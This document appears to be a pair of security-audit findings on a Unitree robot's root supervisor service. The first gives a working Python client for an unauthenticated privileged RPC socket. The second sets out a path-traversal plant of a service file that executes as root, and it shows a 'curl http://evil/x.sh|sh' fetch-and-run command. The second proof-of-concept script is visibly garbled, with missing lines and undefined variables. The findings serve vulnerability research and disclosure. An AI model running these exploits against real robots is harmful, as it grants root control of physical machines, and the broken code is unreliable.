# Finding: AUD-msvc-unauth-rpc-socket

## Primitive
Auth / Access Control Bypass (unauthenticated privileged IPC RPC → root command execution of file-backed Cmd strings)

## Severity
CRITICAL (as the terminal endpoint of the confirmed remote chains; standalone local severity HIGH)

## Condition Analysis

### Summary
`master_service` — the root supervisor that executes every service's Start/Stop/Status `Cmd` string through a shell (it imports `system()`, module/master_service/master_service dynsym) — exposes a protobuf RPC server on the UNIX socket `/unitree/var/run/master_service.sock` (decrypted `master_service.json`, audit/decrypted/etc/master_service.json: `"SocketFileName": "/unitree/var/run/master_service.sock", "ThreadNumber": 5, "QueueLength": 10`). The wire protocol is the shared Unitree SDK2 `unitree::net::RPCServerBase` framework: a 16-byte header of `"ussp"` magic + 12-byte ASCII decimal length, followed by a serialized `unitree.RPCRequest{name, parameter}` protobuf (protocol verified by my own disassembly of the identical statically-linked framework in ota_boxed: `RPCServerBase::RecvRequest` ota_boxed@0x3ea7a4 reads 16 bytes, compares bytes 0-3 against the constant at ota_boxed .rodata 0x6782F8 = `"ussp"`, parses the length with `StringTo<long>` from header bytes 4-15, reads that many bytes, then `ParseFromString`; `RPCServerBase::ServiceContexFunction` ota_boxed@0x3ea518 then calls the registered `std::function` handler directly with **no peer-identity check whatsoever** — no SO_PEERCRED, no token, no uid check anywhere in the path). The shipped runtime log (var/log/master_service/master_service.LOG) proves the live handler table: 12 handlers registered — `ExecuteCmd, GetCmdState, GetServiceEnable, GetServiceState, ListCmdState, ListServiceState, ReloadService, RemoveCmd, RemoveService, RestartService, StartService, StopService`. Any process that can `connect()` to the socket therefore controls the entire robot service lifecycle as root: `StartService(name)`/`RestartService(name)` execute the service's `Cmd` string from `etc/master_service/service/<name>` via `system()` as root; `ExecuteCmd(name)` executes any of the 12 root cmd scripts from `etc/master_service/cmd/`; `ReloadService(name)` re-reads a service JSON from disk (mscli usage text: "reload service if service config file is update"), arming a previously written file; `RemoveService`/`RemoveCmd` delete definitions. There is no authentication between the `accept()` and the handler dispatch.

### Pre-conditions
- master_service running (it is the boot supervisor — always running; log line 1: `MasterService Parse...`).
- Attacker can reach the socket: any local process (all robot services run as root, so local compromise already implies root — the socket matters as a *pivot/consolidation* primitive), OR
- **Network reachability without local code execution**: `robot_state_service` (TCP SDK2 server, grp-bin-009) bridges its network API to this socket: `RobotStateServer::SwitchService(name, enable)` @ robot_state_service 0x507104 → `SwitchServiceLocal` @ 0x50856c → `MSClient::StartService/StopService` → `master_service.sock` (unitree::robot::MSClient symbols in robot_state_service; master_service.sock string present in robot_state_service). A LAN peer that reaches robot_state's TCP RPC can start/stop any master_service service.
- Socket file permission: `UnixStreamSocket::Bind()` (robot_state_service 0x6ce9e8, same framework code master_service embeds) does `RemoveFile(path)` then plain `bind()` with **no `chmod()`** — the socket mode is `0777 & ~umask`, unverified at runtime (UNVERIFIED: master_service's launcher umask is outside the shipped overlay). If umask is permissive (0), every local uid can connect.

### Data Flow
1. Attacker (local process, or LAN peer via robot_state SwitchService bridge) sends `"ussp" + sprintf("%012d", len) + protobuf(RPCRequest{name:"RestartService", parameter:SimpleParameter{name:"<target>"}})` to `/unitree/var/run/master_service.sock`.
   Application: ServiceContexFunction dispatches by the protobuf `name` field to the registered handler (log: `registed handler. name:RestartService`).
2. `RPC_RestartService` → `ChildExecutor::ExecuteServiceStop` + `ExecuteServiceStart` (master_service symbols; shipped log shows the monitor performing exactly this: `stop service success. name:robot_state` → `start service success. name:robot_state`).
3. `ExecuteServiceStart` runs the `Cmd` string from `etc/master_service/service/<name>` through the shell as root (`system()` import; Cmd strings are full shell lines, e.g. service/bashrunner: `export CYCLONEDDS_URI=...;/unitree/sbin/start-stop-daemon --start ...`).
4. With any file-write primitive (OTA install per grp-bin-001: tar-slip into `/unitree/etc/master_service/service/`), the attacker writes a plaintext service JSON with `Cmd: "curl http://evil/x.sh|sh"`, then issues `ReloadService(name)` + `StartService(name)` — arbitrary root command execution. Note: service JSONs are PLAINTEXT (all 29 shipped files readable) — no FMX crypto needed for this pivot.

### The exact wire protocol (re-derived for this PoC from the shipped client, `sbin/mscli`)

`unitree::net::RPCClientBase::SendRequest` (`mscli@0x2cb118`, decompiled) does:

```c
snprintf(s, 0x11u, "%s%012ld", "ussp", len);   // 16-byte header: "ussp" + 12 ASCII decimal digits
send(fd, s, 16);                               // must send EXACTLY 16 bytes
send(fd, serialized_request, len);             // then the protobuf body
```

`RecvResponse` (`mscli@0x2cb44c`) mirrors it: `recv(16)` → `Compare(buf,0,4,"ussp")` →
`StringTo<long>(substr(4))` → `recv(len)` → `ParseFromString`. The server side is the same
framework (`RPCServerBase::RecvRequest`, ota_boxed@0x3ea7a4, statically identical), and
`ServiceContexFunction` (ota_boxed@0x3ea518) then calls the registered `std::function`
**directly — no SO_PEERCRED, no getsockopt, no uid, no token, anywhere in the path.**

The protobuf schema was recovered from the descriptor blob embedded in `sbin/mscli`
(`descriptor_table_rpc_5fservice_5fapi_5fbase_2eproto`, the serialized `FileDescriptorProto`
at file offset `0x4c64c2`; the `master_service.proto` descriptor is at `0x4c6194`):

```proto
// rpc_service_api_base.proto, package unitree, syntax proto3
message RPCRequest  { string name = 1; bytes parameter = 2; }
message RPCResponse { int32 code = 1; bytes data = 2; bytes message = 3; }

// master_service.proto, package unitree.ms
message SimpleParameter { string name = 101; }   // field 101, NOT 1
```

The `SimpleParameter.name` field number is the non-obvious part and was verified twice: from
the descriptor (`\x12\x0c\n\x04name\x18e \x01(\t`, i.e. FieldDescriptorProto.number = 0x65 =
101) and from the generated serializer — `SimpleParameter::_InternalSerialize` (`mscli@0x2b9fd0`)
calls `EpsCopyOutputStream::WriteStringMaybeAliased(a3, 101, ...)`. `RPCRequest`'s fields are
1 and 2 (`RPCRequest::_InternalSerialize`, `mscli@0x2b8f00`-area, calls `WriteStringMaybeAliased(…, 1, …)`
then `WriteBytesMaybeAliased(…, 2, …)`). `Mscli::ExecuteCmd` (`mscli@0x2b6b64`) shows the
reference construction: build `SimpleParameter{name=arg}`, `SerializeToString` it, stuff it
into `RPCRequest{name="ExecuteCmd", parameter=<those bytes>}`, then `RPCClientBase::Call`
with a 30 000 000 (µs) timeout.

### Code — standalone, no protobuf dependency

```python
#!/usr/bin/env python3
"""AUD-msvc-unauth-rpc-socket PoC — unauthenticated privileged RPC on
/unitree/var/run/master_service.sock. 16-byte 'ussp' header + unitree.RPCRequest protobuf;
the ONLY 'auth' is the public 4-byte magic.  Harmless target: ExecuteCmd(net-init),
a shipped cmd script whose decrypted Cmd string is a fixed shell line."""
import socket, sys

SOCK = sys.argv[1] if len(sys.argv) > 1 else "/unitree/var/run/master_service.sock"
VERB = sys.argv[2] if len(sys.argv) > 2 else "ExecuteCmd"
ARG  = sys.argv[3] if len(sys.argv) > 3 else "net-init"

def varint(n):
    out = b""
    while True:
        b, n = n & 0x7F, n >> 7
        out += bytes([b | (0x80 if n else 0)])
        if not n:
            return out

def len_delim(field, payload):                 # proto3 length-delimited field
    return varint((field << 3) | 2) + varint(len(payload)) + payload

def simple_parameter(name):                    # unitree.ms.SimpleParameter{name = 101}
    return len_delim(101, name.encode())

def rpc_request(name, parameter=b""):          # unitree.RPCRequest{name = 1, parameter = 2}
    return len_delim(1, name.encode()) + (len_delim(2, parameter) if parameter else b"")

def read_varint(buf, i):
    val, shift = 0, 0
    while True:
        b = buf[i]; i += 1; val |= (b & 0x7F) << shift
        if not b & 0x80: return val, i
        shift += 7

def parse_msg(buf):                            # minimal response reader
    out, i = {}, 0
    while i < len(buf):
        f, i = read_varint(buf, i)
        field, wt = f >> 3, f & 7
        if wt == 0:
            v, i = read_varint(buf, i)
        elif wt == 2:
            n, i = read_varint(buf, i)
            v, i = buf[i:i + n], i + n
        else:
            break
        out[field] = v
    return out

def frame(body):                               # snprintf("%s%012ld", "ussp", len)
    return b"ussp" + b"%012d" % len(body) + body

body = rpc_request(VERB, simple_parameter(ARG))
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.settimeout(30)                               # mscli uses 30000000 us
s.connect(SOCK)
s.sendall(frame(body))                         # header + protobuf in one shot
hdr = b""
while len(hdr) < 16:
    c = s.recv(16 - len(hdr))
    if not c: raise RuntimeError("closed before header")
    hdr += c
assert hdr[:4] == b"ussp", "bad magic %r" % hdr[:4]
n = int(hdr[4:16]); resp = b""
while len(resp) < n:
    c = s.recv(n - len(resp))
    if not c: break
    resp += c
s.close()
f = parse_msg(resp)
print("RPCRequest{name=%r, parameter=SimpleParameter{name=%r}}" % (VERB, ARG))
print("RPCResponse{code=%s, data=%d B, message=%r}"
      % (f.get(1, 0), len(f.get(2, b"")), f.get(3, b"")))
if f.get(2): print("  data:", f[2].decode(errors="replace")[:400])
```

### Reachability caveat (from the R6 review — keep this distinction in the report)

1. **Local, full 12 handlers.** Requires code execution on the robot; the socket mode is
   `0777 & ~umask` and the umask evidence (10 shipped pid files, all 0666) points to 0, i.e. a
   world-connectable socket — but this is **not runtime-proven** (Virbox virtualization hides
   any explicit `chmod`). Since every robot service runs as root, the local path is a
   *pivot/consolidation* primitive (turn any service compromise into supervisor control),
   not a privilege escalation by itself.
2. **Network, 4 verbs only.** The only network ingress to this socket is
   `RobotStateServer::SwitchService` → `SwitchServiceLocal` (`robot_state_service@0x50856c`)
   → `unitree::robot::MSClient`, and `MSClient`'s complete method set in robot_state_service is
   `ListServiceState / GetServiceState / StartService / StopService` — **no** `ExecuteCmd`,
   `ReloadService`, `RestartService` or `RemoveService`. So a network attacker gets
   Start/Stop of any non-forbidden service (which is itself a root shell of the *already
   loaded* Cmd string), not the full RPC.
3. **The bridge is proven live from DDS, not TCP.** robot_state_service has **no TCP listener**
   (`StreamSocket::Listen`/`LeaseServer`/`RPCServerBase` are dead statically-linked SDK code —
   R6 correction #1). The real ingress is DDS `rt/api/robot_state/request` api_id 1001
   (`RPCServiceSwitch`, JSON `{name, value, switch, boardHg, force}`, `switch≠0`⇒Start / `0`⇒Stop)
   and MQTT `moduleSwitch`. Production proof that a DDS-sourced remote START reaches this

# Finding: AUD-msvc-service-cmd-file-rce

## Primitive
Injection (root command injection via configuration file → `system()`) — the E19 pivot primitive

## Severity
CRITICAL (as the terminal stage of the OTA chain; requires a file-write primitive as the entry)

## Condition Analysis

### Summary
Every service definition `/unitree/etc/master_service/service/<name>` is a PLAINTEXT JSON whose `Start/Stop/Status.Cmd` strings are executed through a shell **as root** by `master_service` (the binary imports `system()`; every shipped Cmd is a full shell line, e.g. `etc/master_service/service/bashrunner`: `export CYCLONEDDS_URI=...;/unitree/sbin/start-stop-daemon --start --background --make-pidfile ...`). Unlike `etc/master_service/cmd/*` (FMX-encrypted), service JSONs need **no cryptography to forge** — any file-write primitive into that directory is a root RCE. The reload semantics that arm the payload are confirmed: configs are loaded into memory at Init (`ChildExecutor::LoadServiceAll`, master_service symtab; log: `load child service config size:27`), and the `ReloadService` RPC re-reads a service's config file from disk when it changed (sbin/mscli usage string: `reloadservice [name] — reload service if service config file is update`), after which `StartService`/`RestartService` execute the new `Cmd` as root. Alternatively the plan/manual lists are fixed files the attacker cannot append to, so auto-start at boot is not granted — the plant needs one StartService RPC after reboot, which is unauthenticated DDS and WebRTC-registered (webrtc_bridge.LOG:5397).

### Why the bashrunner terminal remains the primary chain

The same api-1006 write can instead plant `/unitree/module/bashrunner/command_execution/pwn.md` and fire `{"script":"pwn.md"}` after a bashrunner restart (remotely triggerable via RPCServiceSwitch — no reboot). The service-dir variant documented here is the **persistence-grade** terminal: it survives cleanup of the bashrunner whitelist, re-arms at every boot, and is a distinct root exec path (defense-in-depth evasion). Both terminals share the identical write primitive; auditors/remediators must close the `uid` traversal, not just one landing spot.

### Strategy

Three legs with one reboot in the middle. **Leg A** publishes the api-1006 knowledge
upload on `rt/api/gpt/request` with `uid = "../../../../etc/master_service/service/pwn"`
— **four** `../` segments (R13-corrected: `knowledge_dir_` =
`/unitree/robot/config/chat_go/knowledge` sits 4 levels below `/unitree`; `os.path.normpath`
of the 4-hop uid + `.md` = `/unitree/etc/master_service/service/pwn.md`, while 3 hops land
at `/unitree/robot/etc/...`), and `content` = a complete plaintext service definition
(same Start/Stop/Status shape as the shipped `etc/master_service/service/bashrunner`)
whose `Start.Cmd` is a harmless marker command. `save_knowledge`
(config_manager.py:204-211) interpolates the uid into `f"{knowledge_dir_}/{uid}.md"` with
zero validation and writes it as root. **Arm:** reboot — master_service's `LoadServiceAll`
at Init re-enumerates the directory, so the log count goes 27 → 28 (this is also the
WEAK-HOP check: if the count stays 27, a name filter exists and the hop is falsified).
**Leg B** (post-reboot) publishes api 1001 `RPCServiceSwitch`
`{"name":"pwn.md","switch":1}` on `rt/api/robot_state/request` → `SwitchServiceLocal` →
`MSClient::StartService("pwn.md")` → master_service `system(Start.Cmd)` as root.

### Prerequisites

- Offline mode: Python 3.8+, no deps. Replays the verbatim shipped `save_knowledge`
  (AST-extracted from `module/chat_go/g1/config_manager.py`) into a sandbox standing in
  for `/`, and prints the loader evidence from the shipped logs.
- DDS mode: cyclonedds 0.10.2 + shipped identity + LAN position; one robot reboot between
  Leg A and Leg B (the service table is snapshotted at Init — `robot_state`'s MSClient
  exposes Start/Stop only, no remote ReloadService).
- `pwn.md` is not in the plan/manual auto-start lists (decrypted `etc/manual` =
  `[ai_sport, auto_test_arm, auto_test_low, stereo_patch_pc1]`), so Leg B is required.

"""PoC — AUD-corr-service-dir-md-persistence: api-1006 write -> master_service boot plant.

--mode offline (default, harmless): replays the verbatim shipped save_knowledge into a
  sandbox replicating /unitree/etc/master_service/service (0777), then prints the

import argparse, ast, json, os, re, shutil, sys, tempfile

CM = "/data/lt/audit/unitree/r1/real_unitree_r1_1.4.2/module/chat_go/g1/config_manager.py"
LOGDIR = "/data/lt/audit/unitree/r1/real_unitree_r1_1.4.2/var/log/master_service"
SERVICE_DIR = "/unitree/etc/master_service/service"       # 0777 dir, 27 extensionless defs
MARKER = "/tmp/poc_msvc_plant"

UID = "../../../../etc/master_service/service/pwn"        # 4 hops (R13-corrected)

def service_json(cmd):                                    # same shape as .../service/bashrunner
    return json.dumps({"Start": {"Cmd": cmd, "ExpectCode": [0]},
                       "Stop":  {"Cmd": "true", "ExpectCode": [0, 1]},
                       "Status": {"Cmd": "true", "AliveCode": [0], "DeadCode": [1, 3]}},
                      indent=4)

def verbatim_cm():
    """ConfigManager.add_knowledge/save_knowledge/_get_knowledge_file, AST-extracted
    unchanged from the shipped module, bound to a minimal self."""
    cls = [n for n in ast.parse(open(CM).read()).body
           if isinstance(n, ast.ClassDef) and n.name == "ConfigManager"][0]
    keep = [n for n in cls.body if isinstance(n, ast.FunctionDef)
            and n.name in {"add_knowledge", "save_knowledge", "_get_knowledge_file"}]
    ns = {"os": os, "glob": __import__("glob"), "json": json}
    exec(compile(ast.Module(body=keep, type_ignores=[]), "<verbatim config_manager.py>", "exec"), ns)
    return ns

def offline(_a):

    sdir = os.path.join(root, "unitree/etc/master_service/service")   # 0777 on the robot
    os.makedirs(sdir, exist_ok=True); os.chmod(sdir, 0o777)
    kdir = os.path.join(root, "unitree/robot/config/chat_go/knowledge")
    os.makedirs(kdir, exist_ok=True)
    cm = verbatim_cm()

        knowledge_dir_ = kdir
        knowledge_config_ = []
    Self.save_knowledge = cm["save_knowledge"]
    Self._get_knowledge_file = cm["_get_knowledge_file"]

    cm["add_knowledge"](Self(), [{"uid": UID, "content": payload}])   # runs as root on robot
    planted = os.path.join(sdir, "pwn.md")

          f"{oct(os.stat(sdir).st_mode & 0o777)} (robot ships 0777, defs 0666)")
    print("    planted Start.Cmd master_service will system():",
          json.loads(open(planted).read())["Start"]["Cmd"])

    print("\n[+] LOADER EVIDENCE (LoadServiceAll body is Virbox-virtualized — unreadable;")
    print("    the enumeration claim is INFERRED from the shipped logs):")
    for tag, path, n in (("LOG.1 (prev fw, 2026-03)", f"{LOGDIR}/master_service.LOG.1", 26),
                         ("LOG   (1.4.2, 2026-07)",   f"{LOGDIR}/master_service.LOG",   27)):
        blk = open(path).read().split("load child service config size:")[1]
        loaded = re.findall(r"load child service sucess\. name:(\S+)", blk)[:n]
        print(f"    {tag}: 'load child service config size:{n}' == {n} files in that "
              f"generation's dir; loaded names == filenames verbatim")
    print("    LOG.1 loads dex3_service_l/r + r1_stereo_patch_pc1 (absent from the 1.4.2")
    print("    dir) and lacks stereo_patch_pc1/system_journal/video_hub/videohub_rtsp_server")
    print("    (present in it): 26 - 3 + 4 = 27 — the loaded set TRACKS THE DIRECTORY")
    print("    across two firmware generations. No extension filter is observable anywhere.")
    print("    WEAK-HOP: a name filter that rejects '.' would still fit all observed data;")
    print("    falsifier = one live `mscli startservice pwn.md` after planting, or the")
    print("    boot log reading 'load child service config size:28' + 'name:pwn.md'.")

    print("\n[+] ARM  reboot the robot (LoadServiceAll at master_service Init)")
    print("[+] LEG B (post-reboot)  rt/api/robot_state/request api 1001")
    print('    parameter = {"name":"pwn.md","switch":1}   -> RPCServiceSwitch@0x5034c0')
    print("    -> SwitchServiceLocal@0x50856c -> MSClient::StartService('pwn.md')")
    print("    -> master_service ExecuteServiceStart -> system(Start.Cmd) as root")

        print("    marker:", open(MARKER).read().strip())

if __name__ == "__main__":

    ap.add_argument("--mode", choices=["offline", "dds"], default="offline")

### The WEAK-HOP, stated plainly

master_service is fully Virbox-virtualized (44,408/45,270 FUNC symbols are trampolines
into runtime-decrypted `.bss`), so `LoadServiceAll`'s body cannot be read and the
"`.md`-named file loads as a service" step is **not** instruction-verified. It rests on
the R13 cross-generation log comparison reproduced above: the loaded count equals the
directory file count in **both** generations (26 in the 2026-03 log / 27 in the 2026-07
log), the loaded name set differs exactly as the directory contents differ
(`dex3_service_l/r`, `r1_stereo_patch_pc1` out; `stereo_patch_pc1`, `system_journal`,
`video_hub`, `videohub_rtsp_server` in), and the service JSONs carry no `Name` field
(checked on `stereo_patch_pc1`), so the service name is necessarily the filename. That
is directory enumeration, not a fixed list — but a hypothetical name filter that accepts
every shipped extensionless name while rejecting `.`-containing names is still consistent
with all observed data. Falsifiers, either of which settles it in one shot: (a) the boot
log reading `load child service config size:28` with a `name:pwn.md` line after Leg A, or
(b) one live `mscli startservice pwn.md` on a planted definition. Until one is run, the
`.md`-load hop stays labeled WEAK-HOP. Note the local half of this finding needs none of
it: the directory is 0777 with all 27 plaintext Cmd definitions 0666, so any local uid
can simply rewrite `bashrunner`/`robot_state`/`ota_box` in place (no traversal, no
`.md` suffix question, no reboot if the service is merely restarted).
